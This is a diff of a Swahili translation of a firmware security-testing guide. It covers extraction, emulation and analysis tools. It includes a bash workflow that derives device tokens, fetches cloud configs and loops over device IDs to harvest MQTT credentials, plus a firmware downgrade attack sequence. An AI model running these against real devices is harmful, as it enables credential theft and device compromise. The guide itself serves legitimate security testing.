@@ -1,4 +1,4 @@
-# Uchanganuzi wa Firmware
+# Uchambuzi wa Firmware
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -19,42 +19,46 @@ synology-encrypted-archive-decryption.md
 android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 {{#endref}}
 
-Firmware ni programu muhimu inayoruhusu vifaa kufanya kazi ipasavyo kwa kusimamia na kuwezesha mawasiliano kati ya vipengele vya hardware na software ambavyo watumiaji wanavyoshirikiana navyo. Imehifadhiwa kwenye kumbukumbu ya kudumu, ikihakikisha kifaa kinaweza kupata maagizo muhimu tangu kinapowashwa, jambo linalosababisha uzinduzi wa operating system. Kuchunguza na pengine kubadilisha firmware ni hatua muhimu katika kutambua udhaifu wa usalama.
+{{#ref}}
+mediatek-xflash-carbonara-da2-hash-bypass.md
+{{#endref}}
 
-## **Kukusanya Habari**
+Firmware ni software muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kusimamia na kuwezesha mawasiliano kati ya sehemu za hardware na software ambazo watumiaji wanazitumia. Inahifadhiwa kwenye memory ya kudumu, ikihakikisha kifaa kinaweza kupata maagizo muhimu tangu kinapowashwa, na kupelekea uzinduzi wa mfumo wa uendeshaji. Kuangalia na pengine kubadilisha firmware ni hatua muhimu katika kubaini udhaifu wa usalama.
 
-**Kukusanya habari** ni hatua ya mwanzo muhimu katika kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha ukusanyaji wa data kuhusu:
+## **Kukusanya Taarifa**
 
-- Msanifu wa CPU na sistema ya uendeshaji inayokimbia
-- Maelezo ya bootloader
+**Kukusanya taarifa** ni hatua ya mwanzo muhimu katika kuelewa muundo wa kifaa na teknolojia zinazotumika. Mchakato huu unahusisha kukusanya data kuhusu:
+
+- CPU architecture na operating system inayofanya kazi kwenye kifaa
+- Bootloader specifics
 - Mpangilio wa hardware na datasheets
-- Vipimo vya codebase na maeneo ya chanzo
+- Metrics za codebase na maeneo ya source
 - Maktaba za nje na aina za leseni
 - Historia za updates na vyeti vya udhibiti
 - Mchoro wa usanifu na mtiririko
-- Tathmini za usalama na udhaifu uliotambuliwa
+- Tathmini za usalama na udhaifu uliobainishwa
 
-Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni za thamani sana, kama vile uchambuzi wa vipengele vyovyote vya software za chanzo wazi kupitia mchakato wa ukaguzi kwa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis ya bure ambayo inaweza kutumika kugundua masuala yanayoweza kujitokeza.
+Kwa madhumuni haya, zana za open-source intelligence (OSINT) ni za thamani, kama vile uchambuzi wa vipengele vya open-source kupitia ukaguzi wa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa free static analysis ambazo zinaweza kutumika kugundua matatizo yanayowezekana.
 
 ## **Kupata Firmware**
 
 Kupata firmware kunaweza kufanywa kwa njia mbalimbali, kila moja ikiwa na ngazi yake ya ugumu:
 
-- **Moja kwa moja** kutoka chanzo (waendelezaji, watengenezaji)
-- **Kujenga** kutoka kwa maelekezo yaliyotolewa
-- **Kupakua** kutoka kwa tovuti rasmi za msaada
-- Kutumia maswali ya **Google dork** kutafuta faili za firmware zilizohost
-- Kupata **hifadhi ya wingu** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
-- Kukatiza **updates** kwa kutumia mbinu za man-in-the-middle
-- **Kuchukua** kutoka kwenye kifaa kupitia muunganisho kama **UART**, **JTAG**, au **PICit**
-- **Sniffing** kwa ajili ya maombi ya update ndani ya mawasiliano ya kifaa
+- **Moja kwa moja** kutoka kwa chanzo (developers, manufacturers)
+- **Kujenga** kutoka kwenye maelekezo yaliyotolewa
+- **Kupakua** kutoka kwenye tovuti za support rasmi
+- Kutumia **Google dork** kwa kutafuta faili za firmware zilizochapishwa
+- Kufikia **cloud storage** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
+- Kukamata **updates** kupitia mbinu za man-in-the-middle
+- **Kuchoma** kutoka kwenye kifaa kupitia muunganisho kama **UART**, **JTAG**, au **PICit**
+- **Kuswagi** kwa ajili ya requests za update ndani ya mawasiliano ya kifaa
 - Kutambua na kutumia **hardcoded update endpoints**
-- **Dumping** kutoka bootloader au network
-- **Kuondoa na kusoma** chip ya storage, pale ambapo njia nyingine zote zimeshindwa, kwa kutumia zana za vifaa vinavyofaa
+- **Kudump** kutoka kwenye bootloader au mtandao
+- **Kutoa na kusoma** chip ya storage, pale kila kitu kingine kinaposhindikana, kwa kutumia zana sahihi za hardware
 
 ## Kuchambua firmware
 
-Sasa kwa kuwa **umepata firmware**, unahitaji kutoa taarifa kuhusu yake ili kujua jinsi ya kuichunguza. Zana mbalimbali ambazo unaweza kutumia ni:
+Sasa ikiwa una firmware, unahitaji kutoa taarifa kuhusu ile ili kujua jinsi ya kuitendea. Zana mbalimbali utakazoweza kutumia kwa ajili ya hilo:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -63,25 +67,25 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head # might find signatures in header
 fdisk -lu <bin> #lists a drives partition and filesystems if multiple
 ```
-Iwapo hautopata mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa kutumia `binwalk -E <bin>`. Ikiwa entropy ni ya chini, basi si uwezekano kuwa imeencrypted. Ikiwa entropy ni ya juu, inawezekana imeencrypted (au imecompressed kwa namna fulani).
+Iwapo hautapata mengi kwa zana hizo, angalia **entropia** ya image kwa `binwalk -E <bin>`; ikiwa entropia ni ya chini, basi siyo uwezekano mkubwa kwamba imeencrypted. Ikiwa entropia ni ya juu, inawezekana imeencrypted (au imecompressed kwa namna fulani).
 
-Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files embedded inside the firmware**:
+Zaidi ya hayo, unaweza kutumia zana hizi kutoa **faili zilizomo ndani ya firmware**:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
 {{#endref}}
 
-Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) ili kuchunguza faili.
+Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kwa kuchunguza faili.
 
 ### Kupata Filesystem
 
-Kwa zana zilizotajwa hapo juu kama `binwalk -ev <bin>` unapaswa kuwa umeweza **extract the filesystem**.\
-Binwalk kawaida huiondoa ndani ya **folder named as the filesystem type**, ambayo kawaida ni mojawapo ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
+Kwa kutumia zana zilizotajwa hapo juu kama `binwalk -ev <bin>` unapaswa kuwa umeweza **kutoa filesystem**.\
+Binwalk kawaida huikutoa ndani ya **folda iliyopewa jina kulingana na aina ya filesystem**, ambayo kwa kawaida ni moja ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
 
-#### Uondoaji wa Filesystem kwa Mkono
+#### Utoaji wa Filesystem kwa Mkono
 
-Mara nyingine, binwalk haitakuwa na **the magic byte of the filesystem in its signatures**. Katika kesi hizi, tumia binwalk ili **find the offset of the filesystem and carve the compressed filesystem** kutoka kwa binary na **manually extract** the filesystem kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
+Wakati mwingine, binwalk haitakuwa na **magic byte ya filesystem katika signatures zake**. Katika kesi hizi, tumia binwalk ili **kutafuta offset ya filesystem na carve the compressed filesystem** kutoka kwa binary na **kutoa filesystem kwa mkono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
 ```
 $ binwalk DIR850L_REVB.bin
 
@@ -93,7 +97,7 @@ DECIMAL HEXADECIMAL DESCRIPTION
 1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
 1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
 ```
-Endesha **dd command** ifuatayo ili kuchonga Squashfs filesystem.
+Endesha **dd command** ifuatayo ili kuchonga filesystem ya Squashfs.
 ```
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
@@ -103,7 +107,7 @@ $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
 8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
 ```
-Kwa njia mbadala, amri ifuatayo inaweza pia kutumika.
+Kwa njia nyingine, amri ifuatayo pia inaweza kutumika.
 
 `$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
 
@@ -111,17 +115,17 @@ Kwa njia mbadala, amri ifuatayo inaweza pia kutumika.
 
 `$ unsquashfs dir.squashfs`
 
-Files will be in "`squashfs-root`" directory afterwards.
+Faili zitakuwa katika "`squashfs-root`" saraka baadaye.
 
-- Kwa faili za archive za CPIO
+- Kwa archive za CPIO
 
 `$ cpio -ivd --no-absolute-filenames -F <bin>`
 
-- Kwa filesystem za jffs2
+- Kwa jffs2 filesystems
 
 `$ jefferson rootfsfile.jffs2`
 
-- Kwa filesystem za ubifs zenye NAND flash
+- Kwa ubifs filesystems zenye NAND flash
 
 `$ ubireader_extract_images -u UBI -s <start_offset> <bin>`
 
@@ -129,11 +133,11 @@ Files will be in "`squashfs-root`" directory afterwards.
 
 ## Kuchambua Firmware
 
-Mara firmware inapopatikana, ni muhimu kuichambua ili kuelewa muundo wake na vulnerabilities zinazowezekana. Mchakato huu unajumuisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwenye firmware image.
+Mara firmware inapopatikana, ni muhimu kuichambua ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwenye picha ya firmware.
 
 ### Zana za Uchambuzi wa Awali
 
-Seti ya amri zimetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi zinasaidia kutambua file types, kutoa strings, kuchambua binary data, na kuelewa partition na filesystem details:
+Seti ya amri zimetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchambua data za binary, na kuelewa maelezo ya partition na filesystem:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -142,72 +146,72 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head #useful for finding signatures in the header
 fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
 ```
-Kuamua hali ya encryption ya image, **entropy** huangaliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini inaashiria ukosefu wa encryption, wakati entropy ya juu inaonyesha uwezekano wa encryption au compression.
+Ili kutathmini hali ya encryption ya image, **entropy** inakaguliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini inaonyesha ukosefu wa encryption, wakati entropy ya juu inaashiria uwezekano wa encryption au compression.
 
-Kwa kuchora **embedded files**, zana na rasilimali kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa uchunguzi wa faili zinapendekezwa.
+Kwa kuchukua **embedded files**, zana na rasilimali kama maandiko ya **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili zinapendekezwa.
 
-### Extracting the Filesystem
+### Kutoa Filesystem
 
-Kwa kutumia `binwalk -ev <bin>`, kwa kawaida unaweza kutoa filesystem, mara nyingi ndani ya saraka iliyopewa jina kulingana na aina ya filesystem (mfano, squashfs, ubifs). Hata hivyo, wakati **binwalk** inashindwa kutambua aina ya filesystem kutokana na kukosekana kwa magic bytes, uondoaji wa mkono unahitajika. Hii inahusisha kutumia `binwalk` kupata offset ya filesystem, ikifuatiwa na amri ya `dd` kuchonga kutoka filesystem:
+Kwa kutumia `binwalk -ev <bin>`, kawaida unaweza kutoa filesystem, mara nyingi ndani ya directory yenye jina la aina ya filesystem (mfano, squashfs, ubifs). Hata hivyo, wakati **binwalk** inashindwa kutambua aina ya filesystem kwa kukosa magic bytes, kunahitajika kutoa filesystem kwa mkono. Hii inajumuisha kutumia `binwalk` kutambua offset ya filesystem, kisha kutumia `dd` kukata/kutoa filesystem:
 ```bash
 $ binwalk DIR850L_REVB.bin
 
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 ```
-Baadaye, kulingana na aina ya filesystem (km., squashfs, cpio, jffs2, ubifs), amri tofauti zinatumiwa kutoa yaliyomo kwa mkono.
+Baadaye, kulingana na aina ya filesystem (e.g., squashfs, cpio, jffs2, ubifs), amri tofauti zinaweza kutumika kutoa yaliyomo kwa mkono.
 
 ### Uchambuzi wa mfumo wa faili
 
-Mara mfumo wa faili unapobadilishwa, kutafutwa kwa dosari za usalama kunaanza. Umakini unaelekezwa kwa daemoni za mtandao zisizo salama, nywila zilizowekwa ndani, API endpoints, kazi za seva za update, code isiyotengenezwa, script za kuanza, na binaries zilizokompilika kwa uchambuzi wa nje ya mtandao.
+Baada ya mfumo wa faili kuondolewa, uchunguzi wa dosari za usalama unaanza. Umakini unaelekezwa kwa daemoni za mtandao zisizo salama, nywila zilizowekwa kwa kudumu, API endpoints, huduma za seva za masasisho, code isiyochapishwa, scripts za kuanzishwa, na binaries zilizochapishwa kwa uchambuzi nje ya mtandao.
 
 **Maeneo muhimu** na **vitu** vya kuchunguza ni pamoja na:
 
-- **etc/shadow** and **etc/passwd** kwa nywila na akaunti za watumiaji
-- Vyeti vya SSL na funguo katika **etc/ssl**
-- Faili za konfigurasi na script kwa udhaifu unaowezekana
-- Binaries zilizowekwa kwa uchambuzi zaidi
-- Seva za wavuti za kawaida za kifaa cha IoT na binaries
+- **etc/shadow** na **etc/passwd** kwa nywila za watumiaji
+- Vyeti na funguo za SSL katika **etc/ssl**
+- Faili za usanidi na script kwa ajili ya udhaifu unaoweza kuwepo
+- Embedded binaries kwa uchambuzi zaidi
+- Seva za wavuti za kawaida za vifaa vya IoT na binaries
 
-Vyombo kadhaa vinasaidia kufunua taarifa nyeti na udhaifu ndani ya mfumo wa faili:
+Zana kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya mfumo wa faili:
 
-- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa ajili ya kutafuta taarifa nyeti
+- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa utafutaji wa taarifa nyeti
 - [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi kamili wa firmware
 - [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi wa static na dynamic
 
-### Ukaguzi wa Usalama kwa Binaries zilizokompilika
+### Ukaguzi wa Usalama kwenye binaries zilizochapishwa
 
-Zote source code na binaries zilizokompilika zilizopatikana kwenye mfumo wa faili lazima zichunguzwe kwa udhaifu. Vyombo kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kubaini binaries zisizo na ulinzi ambazo zinaweza kutumiwa.
+Pamoja na source code na binaries zilizochapishwa zilizopatikana kwenye mfumo wa faili, zinapaswa kuchunguzwa kwa udhaifu. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kubaini binaries zisizo na ulinzi ambazo zinaweza kutumiwa.
 
-## Kupata mipangilio ya mawingu na nywila za MQTT kupitia tokeni za URL zilizotokana
+## Kuvuna cloud config na nywila za MQTT kupitia derived URL tokens
 
-Hub nyingi za IoT hupakua konfigurasi maalumu kwa kifaa kutoka kwa endpoint ya cloud inayofanana na:
+Hubs nyingi za IoT hupakua usanidi wa kifaa kwa kila kifaa kutoka kwenye endpoint ya cloud inayofanana na:
 
-- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)
+- `https://<api-host>/pf/<deviceId>/<token>`
 
-Wakati wa uchambuzi wa firmware unaweza kugundua kuwa <token> imetokana mahali hapa kwa kutumia device ID na siri iliyowekwa ndani, kwa mfano:
+Wakati wa uchambuzi wa firmware unaweza kugundua kwamba `<token>` inatokana mahali hapo kutoka kwa device ID kwa kutumia siri iliyowekwa kwa kudumu, kwa mfano:
 
 - token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex
 
-Muundo huu unamruhusu yeyote anayejua deviceId na STATIC_KEY kujenga tena URL na kuvuta konfigurasi ya cloud, mara nyingi ikifichua nywila za MQTT kwa plain text na prefixes za topic.
+Muundo huu unamruhusu mtu yeyote anayejua deviceId na STATIC_KEY kujenga tena URL na kuburuta cloud config, mara nyingi ikifichua nywila za MQTT kwa maandishi wazi na prefiksi za mada.
 
-Mtiririko wa kazi wa vitendo:
+Mtiririko wa vitendo:
 
-1) Chota deviceId kutoka kwenye logi za boot za UART
+1) Chota deviceId kutoka kwa logi za boot za UART
 
-- Unganisha adapter ya UART ya 3.3V (TX/RX/GND) na rekodi logi:
+- Unganisha adapter ya 3.3V UART (TX/RX/GND) na rekodi logi:
 ```bash
 picocom -b 115200 /dev/ttyUSB0
 ```
-- Tafuta mistari inayochapisha cloud config URL pattern na broker address, kwa mfano:
+- Tafuta mistari zinazochapisha cloud config URL pattern na broker address, kwa mfano:
 ```
 Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
 MQTT: mqtt://mq-gw.vendor.tld:8001
 ```
-2) Rejesha STATIC_KEY na algoritimu ya token kutoka firmware
+2) Pata STATIC_KEY na algorithm ya token kutoka firmware
 
-- Pakia binaries kwenye Ghidra/radare2 na tafuta config path ("/pf/") au matumizi ya MD5.
-- Thibitisha algoritimu (e.g., MD5(deviceId||STATIC_KEY)).
-- Pata token kwa Bash na ufanye digest kuwa herufi kubwa:
+- Pakia binaries kwenye Ghidra/radare2 na tafuta path ya config ("/pf/") au matumizi ya MD5.
+- Thibitisha algoritimu (kwa mfano, MD5(deviceId||STATIC_KEY)).
+- Pata token kwa kutumia Bash na badilisha digest kuwa herufi kubwa:
 ```bash
 DEVICE_ID="d88b00112233"
 STATIC_KEY="cf50deadbeefcafebabe"
@@ -215,25 +219,25 @@ printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
 ```
 3) Kukusanya cloud config na MQTT credentials
 
-- Tengeneza URL kisha pakua JSON kwa kutumia curl; tumia jq kuchanganua ili kutoa secrets:
+- Tengeneza URL na pakua JSON kwa curl; changanua kwa jq ili kutoa secrets:
 ```bash
 API_HOST="https://api.vendor.tld"
 TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
 curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
 # Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
 ```
-4) Tumia vibaya MQTT ya plaintext na ACLs dhaifu za mada (ikiwa zipo)
+4) Tumia vibaya plaintext MQTT na topic ACLs dhaifu (ikiwa zipo)
 
-- Tumia maelezo ya kuingia yaliyopatikana kujisajili kwa mada za matengenezo na kutafuta matukio nyeti:
+- Tumia recovered credentials kujiandikisha (subscribe) kwa maintenance topics na kutafuta matukio nyeti:
 ```bash
 mosquitto_sub -h <broker> -p <port> -V mqttv311 \
 -i <client_id> -u <username> -P <password> \
 -t "<topic_prefix>/<deviceId>/admin" -v
 ```
-5) Orodhesha device IDs zinazoweza kutabirika (kwa wingi, kwa idhini)
+5) Orodhesha device IDs zinazotabirika (kwa wingi, kwa idhini)
 
-- Mifumo mingi huingiza vendor OUI/product/type bytes ikifuatiwa na kiambatisho cha mfululizo.
-- Unaweza kurudia IDs zinazowezekana, kutoa tokens na kupata configs kwa njia ya programu:
+- Mifumo mingi huingiza vendor OUI/product/type bytes zikiambatana na nyongeza ya mfululizo.
+- Unaweza kupitia candidate IDs, kutengeneza tokens na kupata configs kwa njia ya programu:
 ```bash
 API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
 for SUF in $(seq -w 000000 0000FF); do
@@ -243,102 +247,102 @@ curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.pas
 done
 ```
 Vidokezo
-- Pata idhini wazi kila wakati kabla ya kujaribu mass enumeration.
-- Pendelea emulation au static analysis ili kupata siri bila kubadilisha target hardware kadri inavyowezekana.
+- Daima upate idhini wazi kabla ya kujaribu mass enumeration.
+- Pendelea emulation au static analysis ili kupata secrets bila kubadilisha target hardware pale inapowezekana.
 
-The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.
+Mchakato wa emulating firmware unaruhusu **dynamic analysis** ya uendeshaji wa kifaa au ya programu moja. Mbinu hii inaweza kukutana na changamoto zinazotokana na utegemezi wa hardware au architecture, lakini kuhamisha root filesystem au binaries maalum hadi kifaa chenye architecture na endianness vinavyofanana, kama Raspberry Pi, au kwa virtual machine iliyotengenezwa mapema, kunaweza kurahisisha majaribio zaidi.
 
-### Emulating Individual Binaries
+### Kuiga binaries binafsi
 
-Kwa kuchunguza programu moja, ni muhimu kutambua endianness ya programu na CPU architecture.
+Kwa kuchunguza programu moja, ni muhimu kubaini endianness ya programu na usanifu wa CPU.
 
-#### Mfano wa MIPS Architecture
+#### Mfano kwa Usanifu wa MIPS
 
-Ili emulate MIPS architecture binary, unaweza kutumia amri:
+Ili kuiga binary ya usanifu wa MIPS, unaweza kutumia amri:
 ```bash
 file ./squashfs-root/bin/busybox
 ```
-Na kusakinisha zana za kuiga zinazohitajika:
+Na kusakinisha zana muhimu za uigaji:
 ```bash
 sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
 ```
-Kwa MIPS (big-endian), `qemu-mips` inatumiwa, na kwa little-endian binaries, `qemu-mipsel` angekuwa chaguo.
+Kwa MIPS (big-endian), `qemu-mips` hutumika, na kwa faili za little-endian, chaguo litakuwa `qemu-mipsel`.
 
-#### Uigaji wa Architecture ya ARM
+#### ARM Architecture Emulation
 
-Kwa ARM binaries, mchakato ni sawa, ukitumia emulator `qemu-arm` kwa uigaji.
+Kwa binaries za ARM, mchakato ni sawa, ambapo emulator `qemu-arm` hutumika kwa emulation.
 
-### Full System Emulation
+### Emulation ya Mfumo Kamili
 
-Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, husaidia uigaji kamili wa firmware, kutautomatisha mchakato na kusaidia katika uchambuzi wa dynamic.
+Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyingine, zinawezesha emulation kamili ya firmware, zinautomatisha mchakato na kusaidia katika uchambuzi wa runtime.
 
-## Dynamic Analysis in Practice
+## Uchambuzi wa Runtime kwa Vitendo
 
-Katika hatua hii, mazingira ya kifaa halisi au yaliyoigizwa hutumika kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na filesystem. Emulation inaweza isiigize kwa ukamilifu mwingiliano wa hardware, hivyo mara kwa mara inabidi kuanzisha emulation upya. Uchambuzi unapaswa kurudia kuchunguza filesystem, exploit webpages zilizo wazi na network services, na kuchunguza udhaifu wa bootloader. Mtihani wa integrity wa firmware ni muhimu kutambua potential backdoor vulnerabilities.
+Katika hatua hii, mazingira ya kifaa halisi au yaliyogisiwa yanatumika kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na filesystem. Emulation inaweza isifanyike kwa usahihi kwa mwingiliano wa vifaa, hivyo mara kwa mara inahitajika kuanzisha tena emulation. Uchambuzi unapaswa kurudia mfumo wa faili, kuchunguza webpages na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Vipimo vya uadilifu vya firmware ni muhimu ili kutambua uwezekano wa backdoor.
 
-## Runtime Analysis Techniques
+## Mbinu za Uchambuzi wa Runtime
 
-Runtime analysis inahusisha kuingiliana na process au binary ndani ya mazingira yake ya uendeshaji, ukitumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kubaini vulnerabilities kupitia fuzzing na mbinu nyingine.
+Uchambuzi wa runtime unahusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, ukitumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kubaini udhaifu kupitia fuzzing na mbinu nyingine.
 
 ## Binary Exploitation and Proof-of-Concept
 
-Kuendeleza PoC kwa vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa target architecture na programming katika lugha za chini. Binary runtime protections katika embedded systems ni nadra, lakini zinapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuwa muhimu.
+Kuendeleza PoC kwa udhaifu uliotambuliwa kunahitaji uelewa wa kina wa architecture lengwa na uandishi wa programu kwa lugha za kiwango cha chini. Ulinzi wa runtime kwa binaries katika mifumo iliyobandika ni nadra, lakini pale ulipo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.
 
-## Prepared Operating Systems for Firmware Analysis
+## Mifumo ya Uendeshaji Iliyo Tayari kwa Uchambuzi wa Firmware
 
-Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira pre-configured kwa firmware security testing, yakiwa na zana muhimu.
+Mifumo ya uendeshaji kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyopangwa awali kwa upimaji wa usalama wa firmware, yakiwa na zana muhimu.
 
-## Prepared OSs to analyze Firmware
+## OS Zilizotayarishwa Kuchambua Firmware
 
-- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Inakuokoa muda kwa kutoa mazingira pre-configured yenye zana zote muhimu.
-- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.
+- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyolenga kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Inakuokoa wakati mwingi kwa kutoa mazingira yaliyopangwa awali na zana zote muhimu zikiwa zimewekwa.
+- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system ya upimaji wa usalama kwa mifumo iliyobandika (embedded) msingi wa Ubuntu 18.04, yenye zana za upimaji wa usalama wa firmware zikiwa zimewekwa awali.
 
-## Firmware Downgrade Attacks & Insecure Update Mechanisms
+## Shambulio za Kupunguza Toleo la Firmware na Vifumo Visivyo Salama vya Masaisho
 
-Hata pale muuzaji anapotekeleza cryptographic signature checks kwa firmware images, **version rollback (downgrade) protection mara nyingi huachwa nje**. Wakati boot- au recovery-loader inathibitisha tu signature kwa embedded public key lakini haisi kulinganisha *version* (au monotonic counter) ya image inayoflashiwa, mshambuliaji anaweza kwa halali kutia **older, vulnerable firmware ambayo bado ina saini halali** na hivyo kure-introduce vulnerabilities zilizotengenezwa patch.
+Hata pale muuzaji anapotekeleza ukaguzi wa saini za cryptographic kwa picha za firmware, **kinga dhidi ya version rollback (downgrade) mara nyingi haipo**. Wakati boot- au recovery-loader inathibitisha tu saini kwa kutumia public key iliyowekwa ndani (embedded) lakini haitofananishi *toleo* (au counter monotonic) ya picha inayoflasha, mshambuliaji anaweza kihalali kusakinisha **firmware ya zamani yenye udhaifu ambayo bado ina saini halali** na kwa hivyo kuirudisha tena udhaifu uliorekebishwa.
 
-Typical attack workflow:
+Mfuatano wa kawaida wa shambulio:
 
-1. **Obtain an older signed image**
-* Pakua kutoka kwenye portal ya upakuaji ya vendor, CDN au tovuti ya support.
-* Toa kutoka kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
-* Ripoti kutoka kwa third-party repositories kama VirusTotal, Internet archives, forums, n.k.
-2. **Upload or serve the image to the device** kupitia channel yoyote ya update iliyo wazi:
+1. **Pata picha iliyo na saini ya zamani**
+* Izipate kutoka kwenye portal ya upakuaji ya umma ya muuzaji, CDN au tovuti ya msaada.
+* Zitolee kutoka kwa programu za kuambatana kwenye mobile/desktop (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
+* Zipate kutoka kwenye hazina za wahusika wengine kama VirusTotal, maktaba za mtandao, vikao, n.k.
+2. **Pakia au tuma picha kwa kifaa** kupitia njia yoyote ya masasisho iliyofunguka:
 * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
-* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints ambazo zinakubali Base64-encoded firmware blobs, kuzitafsiri server-side na kuanzisha recovery/upgrade.
-3. Baada ya downgrade, exploit vulnerability ambayo ilitengenezwa patch katika release mpya (kwa mfano filter ya command-injection ambayo iliongezwa baadaye).
-4. Kwa hiari, flash latest image tena au zima updates ili kuepuka detection mara persistence inapopatikana.
